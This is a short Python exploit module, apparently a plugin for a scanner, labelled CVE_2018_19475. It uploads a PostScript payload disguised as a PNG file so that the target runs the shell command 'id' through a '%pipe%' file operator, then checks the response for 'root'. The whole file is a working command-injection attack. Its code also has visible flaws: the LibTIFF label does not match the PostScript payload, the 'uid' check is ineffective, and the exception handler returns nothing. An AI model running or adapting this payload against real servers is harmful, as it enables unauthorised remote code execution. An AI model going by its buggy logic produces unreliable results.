import requests
from utils import ping
from utils.status import *

class CVE_2018_19475:
    def __init__(self, host) -> None:
        self.name        = "LibTIFF - CVE_2018_19475"
        self.enable      = True
        self.description = ""
        self.host = host

    def isAlive(self, host):
        return ping.is_alive(host)


    def main(self):
        if self.isAlive(self.host):
            try:
                files = {'file_upload': ('333.png',
                                        '%!PS\n0 1 300367 {} for\n{save restore} stopped {} if\n(%pipe%id > /tmp/success && cat /tmp/success) (w) file\n',
                                        'image/png')}

                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Referer': self.host,
                    'Accept-Language': 'zh-CN,zh;q=0.9',
                    'Connection': 'close'
                }

                res = requests.post(self.host, files=files, headers=headers)
                if 'uid' and 'root' in res.text:
                    return SUCCESS
                else:
                    return FAILED
            except Exception as e:
                ERROR

        return ERROR
    
